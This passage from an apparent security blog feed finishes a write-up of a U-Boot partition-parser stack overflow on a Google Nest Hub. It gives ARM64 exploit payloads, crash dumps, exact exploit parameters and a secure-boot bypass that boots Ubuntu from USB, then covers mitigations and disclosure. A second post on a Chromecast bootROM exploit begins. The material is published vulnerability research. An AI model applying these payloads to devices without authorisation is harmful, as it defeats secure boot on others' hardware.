&lt;p&gt;One educated guess is : (gd - 0x8000) = (0x7bee1dc8 - 0x8000) = &lt;strong&gt;0x7BED9DC8&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;

&lt;span class="nl"&gt;_start:&lt;/span&gt;
    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7BED9DC8&lt;/span&gt; &lt;span class="c1"&gt;// payload pointer at offset 0x238&lt;/span&gt;
&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
&lt;span class="nl"&gt;_payload:&lt;/span&gt;
    &lt;span class="nf"&gt;adr&lt;/span&gt; &lt;span class="no"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;x30&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xcafe&lt;/span&gt;
    &lt;span class="nf"&gt;blr&lt;/span&gt; &lt;span class="no"&gt;x13&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The first instruction &lt;em&gt;adr&lt;/em&gt; sets register &lt;em&gt;x19&lt;/em&gt; to the payload's start address.
The last instruction &lt;em&gt;blr&lt;/em&gt; branches to an invalid pointer &lt;em&gt;x13&lt;/em&gt; to ensure a crash, and thus dump registers on UART.&lt;/p&gt;
&lt;p&gt;We &lt;a href="https://github.com/frederic/chipicopwn/commit/e118c46355d35d8ef40450fcbee2ca2ccb49ffb2"&gt;modify the Pico code&lt;/a&gt; to use this new payload. The device crashes again :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x8a000000&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e001&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffcfeb700&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bedd700&lt;/span&gt;
&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5888&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000200&lt;/span&gt;
&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;d63f01a0d2995fd6&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5700&lt;/span&gt;
&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed9dc8&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5960&lt;/span&gt;
&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000&lt;/span&gt;&lt;span class="n"&gt;cafe&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;14001f6e14001&lt;/span&gt;&lt;span class="n"&gt;f6f&lt;/span&gt;

&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Register &lt;em&gt;x22&lt;/em&gt; contains the flag that indicates the payload was executed successfully. And &lt;em&gt;x19&lt;/em&gt; reveals that payload's start address is &lt;strong&gt;0x7bed5700&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To summarize, the exploit requires an USB Mass Storage device with :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;block size of 1024, 2048, 4096, 8192, 16384 or 32768 bytes&lt;/li&gt;
&lt;li&gt;payload contained in block 0&lt;/li&gt;
&lt;li&gt;value 0x000000007bed5700 set at offset 0x238 in block 0&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;3.4 Dumping running bootloader&lt;/h2&gt;
&lt;p&gt;We can now execute arbitrary code. But developing a baremetal payload that loads an alternative bootloader/OS from an USB flash drive is a bit tricky. Instead, it would be easier to directly call the bootloader code already in memory. But to do so, we must first obtain the bootloader.&lt;/p&gt;
&lt;p&gt;We create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/memdump_over_uart.c"&gt;payload that dumps RAM memory over UART&lt;/a&gt;. The information required to control the UART (registers, addresses) is obtained from U-Boot source code.&lt;/p&gt;
&lt;p&gt;First, we dump the &lt;a href="https://github.com/u-boot/u-boot/blob/master/include/asm-generic/global_data.h"&gt;&lt;em&gt;gd&lt;/em&gt; structure&lt;/a&gt; (register &lt;em&gt;x18&lt;/em&gt;), because it contains a pointer to the bootloader code in RAM :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Dumped U-Boot gd structure" src="https://fredericb.info/blog/elaine/struct_gd_dump.png" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
&lt;p&gt;Variable &lt;em&gt;gd-&amp;gt;relocaddr&lt;/em&gt; indicates that the bootloader is at &lt;strong&gt;0x7fef2000&lt;/strong&gt;. We dump memory from this address up to &lt;em&gt;gd-&amp;gt;ram_top&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;3.5 Final payload&lt;/h2&gt;
&lt;p&gt;With the bootloader image in hands, we can design a payload that relies on bootloader functions. We use &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt; to get the address of function &lt;a href="https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84"&gt;run_command_list&lt;/a&gt;, which gives us access to U-Boot built-in commands.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
&lt;span class="nl"&gt;_start:&lt;/span&gt;
    &lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1000 // move SP below us to avoid being overwritten when calling functions&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_bug_ptr&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_bug_fix&lt;/span&gt;
    &lt;span class="nf"&gt;str&lt;/span&gt; &lt;span class="no"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  &lt;span class="c1"&gt;// fix the bug we just exploited&lt;/span&gt;
    &lt;span class="nf"&gt;adr&lt;/span&gt; &lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_command_list&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;w1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xffffffff&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;w2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x0&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x30&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_download_buf&lt;/span&gt; &lt;span class="c1"&gt;// set LR to download buffer&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_run_command_list&lt;/span&gt; &lt;span class="c1"&gt;// load binary into download buffer&lt;/span&gt;
    &lt;span class="nf"&gt;br&lt;/span&gt; &lt;span class="no"&gt;x3&lt;/span&gt;

&lt;span class="nl"&gt;_bug_ptr:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7ff26060&lt;/span&gt;
&lt;span class="nl"&gt;_bug_fix:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0xd65f03c0d2800000&lt;/span&gt;
&lt;span class="nl"&gt;_download_buf:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x01000000&lt;/span&gt;
&lt;span class="nl"&gt;_run_command_list:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7ff24720&lt;/span&gt;
&lt;span class="nl"&gt;_command_list:&lt;/span&gt; &lt;span class="na"&gt;.asciz&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;echo CHIPICOPWN!;osd setcolor 0x1b0d2b0d;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then echo yolo;exit;fi;done;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This final payload :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fixes (in RAM) the bug we just exploited&lt;/li&gt;
&lt;li&gt;calls U-Boot function &lt;a href="https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84"&gt;run_command_list&lt;/a&gt; with &lt;em&gt;_command_list&lt;/em&gt; as argument&lt;/li&gt;
&lt;li&gt;sets the download buffer (0x01000000) as return address to execute next stage (if any)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The U-Boot commands in &lt;em&gt;_command_list&lt;/em&gt; load 2 files from the first FAT partition of USB Mass Storage device :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;CHIPICOPWN.BMP&lt;/em&gt; : the logo to display&lt;/li&gt;
&lt;li&gt;&lt;em&gt;u-boot-elaine.bin&lt;/em&gt; : the next payload to run. In our case, a custom U-Boot image.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once function &lt;em&gt;run_command_list&lt;/em&gt; returns, the next payload is executed.&lt;/p&gt;
&lt;p&gt;Since Rasperry Pi Pico flash memory is limited, we can put the file &lt;em&gt;u-boot-elaine.bin&lt;/em&gt; on another USB flash drive that is hot-swapped with the Pico.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://github.com/frederic/chipicopwn"&gt;source code &amp;amp; prebuilt Pico binary with this final payload are available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="CHIPICOPWN booted on Google Nest Hub" src="https://fredericb.info/blog/elaine/chipicopwn-boot.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;4. Booting Ubuntu from USB&lt;/h1&gt;
&lt;p&gt;We can now boot an unsigned OS thanks to the exploitation tool. As a proof-of-concept, we make a bootable USB flash drive based on the &lt;a href="https://cdimage.ubuntu.com/releases/22.04/release/"&gt;preinstalled Ubuntu image for Raspberry Pi Generic (64-bit ARM)&lt;/a&gt;. Since this Ubuntu image is designed for another target, we must change few things to get it to boot :&lt;/p&gt;
&lt;p&gt;We build a &lt;a href="https://github.com/frederic/elaine-u-boot"&gt;custom U-Boot bootloader&lt;/a&gt; with &lt;a href="https://github.com/frederic/elaine-u-boot/commit/171be963a57cf089d15f6c4f2aa4ffb81d445d1b"&gt;secure boot disabled&lt;/a&gt; and &lt;a href="https://github.com/frederic/elaine-u-boot/commit/7d4ec4f68dc7bdca32511222ff1ed31b30b8f899"&gt;boot flow altered to load environment from USB flash drive&lt;/a&gt;.
We also build a &lt;a href="https://github.com/frederic/elaine-linux"&gt;custom Linux kernel for elaine&lt;/a&gt; with &lt;a href="https://github.com/frederic/elaine-linux/commit/11068237d9178e77d79e3a5d27fc4f8f9b923c51"&gt;additionnal drivers like USB mouse&lt;/a&gt;.
The initial ramdisk (initrd) from Ubuntu is &lt;a href="https://github.com/frederic/elaine-bootimg#ramdisk-details"&gt;repacked&lt;/a&gt; to integrate firmware binaries required for the touchscreen. The boot image is &lt;a href="https://github.com/frederic/elaine-bootimg/blob/main/mkbootimg.sh"&gt;created&lt;/a&gt; based on the custom Linux kernel and modified initrd.&lt;/p&gt;
&lt;p&gt;All these files are copied to the Ubuntu flash drive. &lt;a href="https://github.com/frederic/chipicopwn"&gt;They are available on GitHub, as well as a step-by-step guide.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ubuntu booted on Google Nest Hub" src="https://fredericb.info/blog/elaine/elaine-ubuntu.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Hardware exploration led to uncovering an unexpected USB port. Software exploration revealed that it can boot from an USB Mass Storage device. Bug hunting exposed a stack overflow vulnerability in the DOS partition parser.&lt;/p&gt;
&lt;p&gt;As a result, an attacker can execute arbitrary code at early boot stage (before kernel execution) by plugging a malicious USB device and pressing two buttons.&lt;/p&gt;
&lt;p&gt;Several changes could have reduced the security risk.&lt;/p&gt;
&lt;p&gt;At hardware level, the USB port — which is of no use to users — facilitates the attack. While removing external access to the USB interface doesn't fix the issue, it would require the attacker to fully disassemble the device, thereby increasing the time required to perform the attack.&lt;/p&gt;
&lt;p&gt;At software level, attack surface can be reduced by not relying on partition or filesystem layers in the recovery feature. Instead, U-Boot could have read the recovery image from the raw block device (just like some BL1s read BL2 image).&lt;/p&gt;
&lt;p&gt;Regarding the vulnerability itself, it shouldn't even exist since it's already been fixed upstream, twice :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/fe8c2806cdba70479e351299881a395dc2be7785"&gt;Bug introduced on 2002-11-02&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/54193c5d8133f4f35267f412e5c1bbcbc6ac041c"&gt;Fixed on 2011-07-27&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/8639e34d2c5e12cc2e45c95b1a2e97c22bf6a711"&gt;Bug reintroduced on 2018-02-07&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/7aed3d380981565b5bb2810d5d13aad1ff994f1a"&gt;Fixed 2019-09-19&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The lack of CVE may explain why it hasn't been propagated downstream.&lt;/p&gt;
&lt;p&gt;Finally, mitigations in U-Boot, like stack canary or ASLR, could have made exploitation way harder, especially considering the &lt;em&gt;black-box&lt;/em&gt; approach.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2021-10-28 : Attack vector doesn't qualify for Pwn2Own 2021&lt;/li&gt;
&lt;li&gt;2021-11-01 : Vulnerability disclosed to Google&lt;/li&gt;
&lt;li&gt;2021-12 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : Security update released by Google&lt;/li&gt;
&lt;li&gt;2022-06-15 : Public disclosure&lt;/li&gt;
&lt;/ul&gt;</content><category term="arm"></category><category term="amlogic"></category><category term="bootloader"></category><category term="exploit"></category><category term="nest"></category><category term="secureboot"></category><category term="uboot"></category><category term="ubuntu"></category><category term="usb"></category></entry><entry><title>Booting Ubuntu on Google Chromecast With Google TV</title><link href="https://fredericb.info/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html" rel="alternate"></link><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2021-11-29:/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html</id><summary type="html">&lt;p&gt;In a previous post, we detailed &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;a vulnerability in the Amlogic System-On-Chip bootROM&lt;/a&gt; that allows arbitrary code execution at EL3.
Since the &lt;a href="https://store.google.com/us/product/chromecast_google_tv"&gt;Chromecast with Google TV&lt;/a&gt; (CCwGTV) is one of the devices affected by this issue, it opens the possibility to run a custom OS like Ubuntu.&lt;/p&gt;
&lt;p&gt;This post describes …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In a previous post, we detailed &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;a vulnerability in the Amlogic System-On-Chip bootROM&lt;/a&gt; that allows arbitrary code execution at EL3.
Since the &lt;a href="https://store.google.com/us/product/chromecast_google_tv"&gt;Chromecast with Google TV&lt;/a&gt; (CCwGTV) is one of the devices affected by this issue, it opens the possibility to run a custom OS like Ubuntu.&lt;/p&gt;
&lt;p&gt;This post describes the journey to boot Ubuntu on CCwGTV starting from arbitrary code execution in its bootROM. All the resources (bootloaders/tools/scripts) are &lt;a href="https://github.com/frederic/sabrina-custom-os"&gt;available on GitHub, as well as a step-by-step guide&lt;/a&gt;.&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/pBg6oJn8aZM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;

&lt;h1&gt;Disclaimer&lt;/h1&gt;
&lt;p&gt;You are solely responsible for any damage caused to your hardware/software/keys/DRM licences/warranty/data/cat/etc...&lt;/p&gt;
&lt;h1&gt;A straightforward plan&lt;/h1&gt;
&lt;p&gt;CCwGTV, released on September 30th 2020, is based on the Amlogic S905D3 System-on-Chip and runs Android OS.
The objective is to boot Ubuntu instead, and doing so from an USB drive to keep the original OS untouched.&lt;/p&gt;
&lt;p&gt;The device implements Secure Boot, which means each software component of the boot chain is &lt;a href="https://en.wikipedia.org/wiki/Digital_signature"&gt;digitally signed&lt;/a&gt; to prevent non-official code execution.
In order to boot a custom OS like Ubuntu, we'll rely on the bootROM vulnerability to break the Secure Boot and run custom code via the USB interface.&lt;/p&gt;
&lt;p&gt;Google has &lt;a href="https://support.google.com/chromecastbuiltin/answer/6121012"&gt;released Open Source code&lt;/a&gt; of U-Boot and Linux for this device, which is very helpful for this project.&lt;/p&gt;
&lt;p&gt;First, we'll obtain the &lt;em&gt;bootloader&lt;/em&gt; image and extract BL2 image to customize it.
Then, we'll build a custom U-Boot image that boots from USB flash drive by default.
Finally, we'll repack the &lt;em&gt;bootloader&lt;/em&gt; image with our custom U-Boot image.&lt;/p&gt;
&lt;h1&gt;Boot chain overview&lt;/h1&gt;
&lt;p&gt;The boot chain of this device is based on &lt;a href="https://github.com/ARM-software/arm-trusted-firmware"&gt;ARM Trusted Firmware&lt;/a&gt; (ATF).
In this design, the boot flow is divided in 5 steps executed one after another :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Boot Loader stage 1 (BL1) &lt;em&gt;AP Trusted ROM&lt;/em&gt; ↴&lt;/li&gt;
&lt;li&gt;Boot Loader stage 2 (BL2) &lt;em&gt;Trusted Boot Firmware&lt;/em&gt; ↴&lt;/li&gt;
&lt;li&gt;Boot Loader stage 3-1 (BL31) &lt;em&gt;EL3 Runtime Software&lt;/em&gt; ↴&lt;/li&gt;
&lt;li&gt;Boot Loader stage 3-2 (BL32) &lt;em&gt;Secure-EL1 Payload&lt;/em&gt; (optional) ↴&lt;/li&gt;
&lt;li&gt;Boot Loader stage 3-3 (BL33) &lt;em&gt;Non-trusted Firmware&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first stage of the boot flow, referred to as BL1, is the SoC bootROM. All firmware images for the next stages are stored in the &lt;em&gt;bootloader&lt;/em&gt; partition on the internal flash memory.
The last stage, referred to as BL33, is the U-Boot image; unique Open Source firmware in this boot chain.&lt;/p&gt;
&lt;p&gt;Using the vulnerability, we can exploit BL1 to run arbitrary code as BL2 stage. But we can't just run U-Boot as a BL2 image: all the firmwares are required to properly initialize the board (&lt;a href="https://en.wikipedia.org/wiki/Phase-locked_loop"&gt;PLL&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/Clock_signal"&gt;clocks&lt;/a&gt;, DDR training, ...). So we have to load all the firmwares, and only replace the last one (BL33) with our custom U-Boot image.&lt;/p&gt;
&lt;p&gt;Fortunately, the entire boot chain is designed to support loading over USB : if BL2 image detects that it has been loaded (in SRAM) via USB, it loads all the next stages (BL3x) over USB instead of the internal eMMC storage memory. The &lt;a href="https://github.com/khadas/utils/blob/master/aml-flash-tool/tools/linux-x86/update"&gt;host-side tool&lt;/a&gt; to send the bootloaders via USB is even provided by Khadas.&lt;/p&gt;
&lt;h1&gt;Getting the firmware : the hard way&lt;/h1&gt;
&lt;p&gt;When I started this research, no firmware or update files were available to download. So I had to remove the eMMC flash chip to dump the firmware and get a copy of the &lt;em&gt;bootloader&lt;/em&gt; partition.&lt;/p&gt;
&lt;p&gt;&lt;img alt="eMMC chip-off" src="https://fredericb.info/blog/sabrina/sabrina-emmc.png"&gt;&lt;/p&gt;
&lt;p&gt;I used a &lt;strong&gt;YIHUA 8786D hot air rework station&lt;/strong&gt; to remove the chip, and a &lt;strong&gt;ALLSOCKET eMMC153/169-SD Adapter&lt;/strong&gt; to dump its content. Since it was my first attempt at eMMC chip-off technique, I followed the instructions given in a great talk from &lt;a href="https://www.exploitee.rs/"&gt;Exploitee.rs&lt;/a&gt; at &lt;a href="https://www.blackhat.com/us-17/briefings/schedule/#hacking-hardware-with-a--sd-card-reader-6753"&gt;Black Hat 2017&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Later on, few &lt;a href="https://forum.xda-developers.com/t/cc-w-gtv-sabrina-new-ota-factory-image-dump.4198909/"&gt;OTA update files&lt;/a&gt; appeared online, so this hardware modification is no longer required to get the &lt;em&gt;bootloader&lt;/em&gt; partition image.&lt;/p&gt;
